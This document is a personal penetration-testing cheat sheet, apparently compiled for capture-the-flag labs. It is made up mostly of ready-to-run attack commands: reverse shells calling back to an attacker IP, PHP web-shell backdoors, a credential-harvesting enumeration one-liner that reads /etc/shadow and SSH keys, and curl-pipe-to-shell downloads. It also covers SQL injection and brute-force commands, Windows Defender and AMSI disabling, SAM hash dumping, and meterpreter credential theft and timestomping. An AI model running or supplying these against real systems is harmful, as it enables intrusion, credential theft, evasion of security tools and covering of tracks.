
ONE-LINER
---------------------------------------------------------------------------------------------------------------------
Reverse Shell One-Liner
perl -e 'use Socket;$i="#URL_HERE#";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

Open a netcat on your system using
nc -lnvp 4444

----------------------------------------------------------
Python reverse shell

/usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.36.200",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

----------------------------------------------------------
Backdoor One-Liner
<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>

Smaller Backdoor One-Liner
<?=`$_GET[_]`?>

----------------------------------------------------------

Python Privilege Escalation
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
----------------------------------------------------------
Enumerate possibly installed useful binaries
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc gcc-5 g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo nano fetch docker lxc ctr runc rkt kubectl 2>/dev/null

----------------------------------------------------------

DIRECTORY ENUMERATION TOOLS
gobuster dir -u 10.10.187.142 -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 120 -x txt,php,html

Another Dict Location
/usr/share/wordlists/seclists/Discovery/Web-Content/common.txt

feroxbuster -u  http://10.10.101.55:9999/ --thorough -x php,txt -t 100 --random-agent -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt --depth 1



__________________________________________________________

SQLMAP COMMAND


FOR URLS
sqlmap -u "http://10.10.94.82/simple/moduleinterface.php?mact=News,m1_,default,0" --tamper=between,space2comment --threads=10 --random-agent --batch --retries=7 --time-sec 10 --answers="existence check=Y, dictionary-based attack=Y, what dictionary=2, the custom=~/Downloads/favpass.txt" --dbs

FOR POST-REQUESTS
sqlmap -r postrequest.txt -p Username --tamper=between,space2comment --threads=10 --random-agent --batch --retries=7 --time-sec 10 --answers="existence check=Y, dictionary-based attack=Y, what dictionary=2, the custom=~/Downloads/favpass.txt" --dbs










----------------------------------------------------------
Linpeas One-Liner
file="/tmp/linPE";RED='\033[0;31m';Y='\033[0;33m';B='\033[0;34m';NC='\033[0m';rm -rf $file;echo "File: $file";echo "[+]Gathering system information...";printf $B"[*] "$RED"BASIC SYSTEM INFO\n"$NC >> $file ;echo "" >> $file;printf $Y"[+] "$RED"Operative system\n"$NC >> $file;(cat /proc/version || uname -a ) 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"PATH\n"$NC >> $file;echo $PATH 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Date\n"$NC >> $file;date 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Sudo version\n"$NC >> $file;sudo -V 2>/dev/null| grep "Sudo ver" >> $file;echo "" >> $file;printf $Y"[+] "$RED"selinux enabled?\n"$NC >> $file;sestatus 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Useful software?\n"$NC >> $file;which nc ncat netcat wget curl ping gcc make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Capabilities\n"$NC >> $file;getcap -r / 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Environment\n"$NC >> $file;(set || env) 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Top and cleaned proccesses\n"$NC >> $file;ps aux 2>/dev/null | grep -v "\[" >> $file;echo "" >> $file;printf $Y"[+] "$RED"Binary processes permissions\n"$NC >> $file;ps aux 2>/dev/null | awk '{print $11}'|xargs -r ls -la 2>/dev/null |awk '!x[$0]++' 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Services\n"$NC >> $file;(/usr/sbin/service --status-all || /sbin/chkconfig --list || /bin/rc-status) 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Different processes executed during 1 min (HTB)\n"$NC >> $file;if [ "`ps -e --format cmd`" ]; then for i in {1..121}; do ps -e --format cmd >> $file.tmp1; sleep 0.5; done; sort $file.tmp1 | uniq | grep -v "\[" | sed '/^.\{500\}./d' >> $file; rm $file.tmp1; fi;echo "" >> $file;printf $Y"[+] "$RED"Proccesses binary permissions\n"$NC >> $file;ps aux 2>/dev/null | awk '{print $11}'|xargs -r ls -la 2>/dev/null |awk '!x[$0]++' 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Scheduled tasks\n"$NC >> $file;crontab -l 2>/dev/null >> $file;ls -al /etc/cron* 2>/dev/null >> $file;cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root /var/spool/anacron 2>/dev/null | grep -v "^#" >> $file;echo "" >> $file;printf $Y"[+] "$RED"Any sd* disk in /dev?\n"$NC >> $file;ls /dev 2>/dev/null | grep -i "sd" >> $file;echo "" >> $file;printf $Y"[+] "$RED"Storage information\n"$NC >> $file;df -h 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Unmounted file-system?\n"$NC >> $file;cat /etc/fstab 2>/dev/null | grep -v "^#" >> $file;echo "" >> $file;printf $Y"[+] "$RED"Printer?\n"$NC >> $file;lpstat -a 2>/dev/null >> $file;echo "" >> $file;echo "" >> $file;echo "[+]Gathering network information...";printf $B"[*] "$RED"NETWORK INFO\n"$NC >> $file ;echo "" >> $file;printf $Y"[+] "$RED"Hostname, hosts and DNS\n"$NC >> $file;cat /etc/hostname /etc/hosts /etc/resolv.conf 2>/dev/null | grep -v "^#" >> $file;dnsdomainname 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Networks and neightbours\n"$NC >> $file;cat /etc/networks 2>/dev/null >> $file;(ifconfig || ip a) 2>/dev/null >> $file;iptables -L 2>/dev/null >> $file;ip n 2>/dev/null >> $file;route -n 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Ports\n"$NC >> $file;(netstat -punta || ss -t; ss -u) 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Can I sniff with tcpdump?\n"$NC >> $file;timeout 1 tcpdump >> $file 2>&1;echo "" >> $file;echo "" >> $file;echo "[+]Gathering users information...";printf $B"[*] "$RED"USERS INFO\n"$NC >> $file ;echo "" >> $file;printf $Y"[+] "$RED"Me\n"$NC >> $file;(id || (whoami && groups)) 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Sudo -l without password\n"$NC >> $file;echo '' | sudo -S -l -k 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Do I have PGP keys?\n"$NC >> $file;gpg --list-keys 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Superusers\n"$NC >> $file;awk -F: '($3 == "0") {print}' /etc/passwd 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Login\n"$NC >> $file;w 2>/dev/null >> $file;last 2>/dev/null | tail >> $file;echo "" >> $file;printf $Y"[+] "$RED"Users with console\n"$NC >> $file;cat /etc/passwd 2>/dev/null | grep "sh$" >> $file;echo "" >> $file;printf $Y"[+] "$RED"All users\n"$NC >> $file;cat /etc/passwd 2>/dev/null | cut -d: -f1 >> $file;echo "" >> $file;echo "" >> $file;echo "[+]Gathering files information...";printf $B"[*] "$RED"INTERESTING FILES\n"$NC >> $file ;echo "" >> $file;printf $Y"[+] "$RED"SUID\n"$NC >> $file;find / -perm -4000 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"SGID\n"$NC >> $file;find / -perm -g=s -type f 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Files inside \$HOME (limit 20)\n"$NC >> $file;ls -la $HOME 2>/dev/null | head -n 20 >> $file;echo "" >> $file;printf $Y"[+] "$RED"20 First files of /home\n"$NC >> $file;find /home -type f 2>/dev/null | column -t | grep -v -i "/"$USER | head -n 20 >> $file;echo "" >> $file;printf $Y"[+] "$RED"Files inside .ssh directory?\n"$NC >> $file;find  /home /root -name .ssh 2>/dev/null -exec ls -laR {} \; >> $file;echo "" >> $file;printf $Y"[+] "$RED"*sa_key* files\n"$NC >> $file;find / -type f -name "*sa_key*" -ls 2>/dev/null -exec ls -l {} \; >> $file;echo "" >> $file;printf $Y"[+] "$RED"Mails?\n"$NC >> $file;ls -alh /var/mail/ /var/spool/mail/ 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"NFS exports?\n"$NC >> $file;cat /etc/exports 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Hashes inside /etc/passwd? Readable /etc/shadow or /etc/master.passwd?\n"$NC >> $file;grep -v '^[^:]*:[x]' /etc/passwd 2>/dev/null >> $file;cat /etc/shadow /etc/master.passwd 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Readable /root?\n"$NC >> $file;ls -ahl /root/ 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Inside docker or lxc?\n"$NC >> $file;dockercontainer=`grep -i docker /proc/self/cgroup  2>/dev/null; find / -name "*dockerenv*" -exec ls -la {} \; 2>/dev/null`;lxccontainer=`grep -qa container=lxc /proc/1/environ 2>/dev/null`;if [ "$dockercontainer" ]; then echo "Looks like we're in a Docker container" >> $file; fi;if [ "$lxccontainer" ]; then echo "Looks like we're in a LXC container" >> $file; fi;echo "" >> $file;printf $Y"[+] "$RED"*_history, profile, bashrc, httpd.conf\n"$NC >> $file;find / -type f \( -name "*_history" -o -name "profile" -o -name "*bashrc" -o -name "httpd.conf" \) -exec ls -l {} \; 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"All hidden files (not in /sys/) (limit 100)\n"$NC >> $file;find / -type f -iname ".*" -ls 2>/dev/null | grep -v "/sys/" | head -n 100 >> $file;echo "" >> $file;printf $Y"[+] "$RED"What inside /tmp, /var/tmp, /var/backups\n"$NC >> $file;ls -a /tmp /var/tmp /var/backups 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Interesting writable Files\n"$NC >> $file;USER=`whoami`;HOME=/home/$USER;find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | grep -v '/sys/fs'| sort | uniq >> $file;for g in `groups`; do find / \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME | grep -v '/sys/fs'; done >> $file;echo "" >> $file;printf $Y"[+] "$RED"Web files?(output limited)\n"$NC >> $file;ls -alhR /var/www/ 2>/dev/null | head >> $file;ls -alhR /srv/www/htdocs/ 2>/dev/null | head >> $file;ls -alhR /usr/local/www/apache22/data/ 2>/dev/null | head >> $file;ls -alhR /opt/lampp/htdocs/ 2>/dev/null | head >> $file;echo "" >> $file;printf $Y"[+] "$RED"Backup files?\n"$NC >> $file;find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*back*" -o -name "*bck*" \) 2>/dev/null >> $file;echo "" >> $file;printf $Y"[+] "$RED"Find IPs inside logs\n"$NC >> $file;grep -a -R -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' /var/log/ 2>/dev/null | sort | uniq >> $file;echo "" >> $file;printf $Y"[+] "$RED"Find 'password' or 'passw' string inside /home, /var/www, /var/log, /etc\n"$NC >> $file;grep -lRi "password\|passw" /home /var/www /var/log 2>/dev/null | sort | uniq >> $file;echo "" >> $file;printf $Y"[+] "$RED"Sudo -l (you need to puts the password and the result appear in console)\n"$NC >> $file;sudo -l;









wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh -O linpeas.sh




curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh




---------------------------------------------------------
find suid binaries for privilege escalation one liner
find / -perm +6000 2>/dev/null | grep '/bin/'

find suid binaries for privilege escalation one liner
find / -perm -4000 2>/dev/null

find suid binaries for root privilege escalation one liner (tryhackme)
find / -user root -perm -4000 -exec ls -ldb {} \;

find files that can be run by group for privilege escalation one liner

find / -group <groupname> -type f 2>/dev/null




----------------------------------------------------------
Make shell interactive(fix tty issue)
find . -exec /bin/sh \; -quit


Make shell interactive 
python -c 'import pty;pty.spawn("/bin/bash")'


Make shell interactive with arrow use, etc...

python -c 'import pty;pty.spawn("/bin/bash");'
CTRL + Z         #backgrounds netcat session
stty raw -echo
fg               #brings netcat session back to the foreground
export TERM=xterm

----------------------------------------------------------
Copy files over ssh from attacker machine to victim
scp ~/Documents/tools/linpeas.sh jan@10.10.58.82:/dev/shm

CRACKING
---------------------------------------------------------------------------------------------------------------------
Identifying a hash
hashidentifier


Crack an md5 hash
hashcat -m 0 -a 0 -o cracked.txt c3fcd3d76192e4007dfb496cca67e13b ~/Downloads/favpass.txt


TO BRUTEFORCE USERNAME FROM LIST WITH PASSWORD AS "test"
hydra -L passlist.txt -p test 10.10.129.143 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username" -t 30

TO BRUTEFORCE PASSWORD FROM LIST WITH USERNAME AS "Elliot"
hydra -l Elliot -P passlist 10.10.129.143 http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username" -t 30

BRUTEFORCE AN SSH PASSWORD FROM LIST USING USERNAME
hydra -l jan -P pass.txt 192.168.29.135 ssh -t 4

EXTRACT HASH FROM PRIVATE SSH KEY
ssh2john #SSH PRIVATE KEY FILE# > #FILE TO OUTPUT HASH TO#

CRACK HASHED PRIVATE SSH KEY
john #FILE CONTANING PRIVATE SSH HASH# --wordlist=#PATH TO WORDLIST FOR BRUTEFORCE#


EXTRACT HASH FROM PRIVATE PGP/ASC KEY
gpg2john tryhackme.asc > pgpjohn









TOOLS
-----------------------------------------------------------------------------------------------------------------------
wpscan --api-token #WPSCAN_API# --random-user-agent -e --url 3#URL_HERE# | tee wpscan.txt

python3 sqlmap.py -u "https://#URL_HERE#/?s= --tamper=between,space2comment --threads=10 --random-agent --batch --retries=7 --time-sec 10 --answers="existence check=Y, dictionary-based attack=Y, what dictionary=2, the custom=~/dict/favpass.txt" --dbs








MULTILINE PRIVILEGE ESCALATION
------------------------------------------------------------------------------------------------------------------------
Nmap Privilege Escalation
nmap --interactive
nmap> !sh





ENUMERATION
------------------------------------------------------------------------------------------------------------------------
use
enum4linux -a IPADDRESS
to enumerate users and possibly passwords on machines that have smb open








WINDOWS DEFENDER BYPASS
-----------------------------------------------------------------------------------------------------------------------

Windows Defender Evasion
Note: All below commands require administrative privileges on the system!

You can query Defender exclusions using PowerShell. If it returns any excluded paths, just execute your malware from there!

Get-MpPreference | select-object -ExpandProperty ExclusionPath

# Disable Defender. It goes without saying that disabling AV/EDR products is never a good idea in practice, best to work around it instead. 🚩
sc config WinDefend start= disabled
sc stop WinDefend
Set-MpPreference -DisableRealtimeMonitoring $true

## Exclude a process / location (Add an exclusion directory for your shady stuff. 👀)
Set-MpPreference -ExclusionProcess "word.exe", "vmwp.exe"
Add-MpPreference -ExclusionProcess 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
Add-MpPreference -ExclusionPath C:\Video, C:\install

# Disable scanning all downloaded files and attachments, disable AMSI (reactive)
PS C:\> Set-MpPreference -DisableRealtimeMonitoring $true; Get-MpComputerStatus
PS C:\> Set-MpPreference -DisableIOAVProtection $true
# Disable AMSI (set to 0 to enable)
PS C:\> Set-MpPreference -DisableScriptScanning 1 

# Blind ETW Windows Defender: zero out registry values corresponding to its ETW sessions
reg add "HKLM\System\CurrentControlSet\Control\WMI\Autologger\DefenderApiLogger" /v "Start" /t REG_DWORD /d "0" /f

# Wipe currently stored definitions
# Location of MpCmdRun.exe: C:\ProgramData\Microsoft\Windows Defender\Platform\<antimalware platform version>
MpCmdRun.exe -RemoveDefinitions -All

# Remove signatures (if Internet connection is present, they will be downloaded again):
PS > & "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe" -RemoveDefinitions -All
PS > & "C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All

# Disable Windows Defender Security Center
reg add "HKLM\System\CurrentControlSet\Services\SecurityHealthService" /v "Start" /t REG_DWORD /d "4" /f

# Disable Real Time Protection
reg delete "HKLM\Software\Policies\Microsoft\Windows Defender" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Policies\Microsoft\Windows Defender" /v "DisableAntiVirus" /t REG_DWORD /d "1" /f






MISC
-----------------------------------------------------------------------------------------------------------------------
use 
sudo -l
to see commands that can be run by the current user

use
sudo su - username
to switch to that user

---------------------------
when running reverse shells, try using port 53, that's the DNS shell and it's very rarely blocked for outgoing connections by firewalls

---------------------------
INTERCHANGEABLE COMMANDS
head,cat,less,more,tail

---------------------------
SITES FOR COMMANDS
https://gtfobins.github.io/
https://wadcoms.github.io


---------------------------

MAKE SURE TO CHECK IN HOME FOLDER OF OTHER USERS FOR SSH KEYS
___________________________

To open a root shell
sudo -s

---------------------------

MAKE SURE TO RUN NMAP, THEN GOBUSTER

---------------------------

login to phpmyadmin of remote server
mysql -u root -p -h #SERVER IP ADDRESS#


---------------------------

you could try curling the open ports of the webserver from itself (use 127.0.0.1) and is there is a mysql port, you could try finding the login page, extracting the password, and logging in to see other data

---------------------------

DECRYPTING PGP FILE
gpg --import tryhackme.asc
gpg --decrypt credential.pgp

---------------------------

COMMANDS FOR POP3

To login to pop3

user <username with or without the @>
pass <password>

After successful login use the following command to list email in inbox of user

list

After list email, use the following command to read the email. S/N is the list number

retr S/N




----------------------------
If there's a banner on ssh login, try to see if you can modify any of the files in

/etc/update-motd.d

add a reverse shell and it should run as root when any ssh user logs in

----------------------------
check what groups your user belongs to with <id>, there may be an exploit to escalate privileges for a group like lxd 



----------------------------

if you can run a command as another user, especially through a file that takes command input, you start a shell as that user
----------------------------


To extract files from a steganofied picture use
steghide extract -sf file.jpg

hit enter for no passphrase
----------------------------

to break into zipfiles, use

zip2john zipfile > file_to_store_hash

then

john file_to_store_hash --wordlist="/path/to/wordlist"

----------------------------

base64 -d <<< "base64_text_to_be_decoded"

----------------------------	

To crack a shadow file, run the following command to concatenate the shadow and passwd file

unshadow passwd.txt shadow.txt > unshadowed.txt

then feed it to john

john unshadowed.txt --wordilst="/path/to/wordlist/"

----------------------------

grab the banner of a server using this

curl -I site_or_IP_address


----------------------------

get the os and details of machine using this

uname -a
----------------------------

if sudo doesn't exist, try checking for apt or dpkg. You can auto install it through apt or a downloaded deb package.

you could also try unpacking the package of sudo manually, it'll probably work

----------------------------
set suid on bash using
chmod +s /bin/bash

after setting suid binary on bash (/bin/bash), migrate bash session to a root session using "bash -p"

----------------------------


Get on the victim's computer, open their registry editor, navigate to HKEY_LOCAL_MACHINE and save the "SAM" and "SYSTEM" folders.
NOTE: USER MUST BE AN ADMINISTRATOR
You can easily do this from a terminal by running
reg save HKLM\sam ./sam.save
reg save HKLM\system ./system.save

copy the saved files to a flash drive

Open up your kali and run the following tool to extract hash from the files
impacket-secretsdump -sam sam.save -system system.save LOCAL

grab the column of the users that is the nthash

run through a hash cracker. may be use cupps tool to generate personalised dictionary list.

After getting the password, run the following to get a powershell of the victim pc on your own pc
evil-winrm -i #VICTIM_IP_ADDRESS# -u #VICTIM_USERNAME# -p #VICTIM_PASSWORD#

an alternative that does the same is
python3 psexec.py #DOMAIN_NAME#/#VICTIM_USERNAME#:#VICTIM_PASSWORD#@#VICTIM_IP_ADDRESS#


Youc can also run the following to get rdp into victim system
xfreerdp /v:#VICTIM_IP_ADDRESS# /u:#VICTIM_USERNAME# /p:#VICTIM_PASSWORD#



----------------------------

To find subdomains when pentesting,
- use crt.sh
- use google dork "-site:#WEB_SITE# site:*.#WEBSITE#"
- use sn1per (this covers practically everything)
- use gobuster/feroxbuster

- use black widow (this allows you get list of urls and forms you can run in sqlmap)

-----------------------------
load powershell		#load powershell module into meterpreter
load kiwi		#load mimikatz into meterpreter
creds_all		#command to dump all credentails after loading kiwi
timestomp		#use this to hide or mimic access and creation time of a file. This further covers your tracks. the '-v' options shows the MACE of a file '-f' mimics timestamp of another file #timestomp your_file -f file_to_mimic# and '-b' blanks the timestamp

run post/multi/recon/local_exploit_suggester		#background the meterpreter session and run this for privilege escalation. It uses WinPEAS.

getsystem		#use this to attempt to escalate privileges on victim machine through meterpreter. If it doesn't run then perhaps the priv extension isn't loaded. Run "use priv" to load it.

migrate #PROCESS PID#	#use this to migrate into another process, perhaps the printer service so you can access processes such as lsass.exe
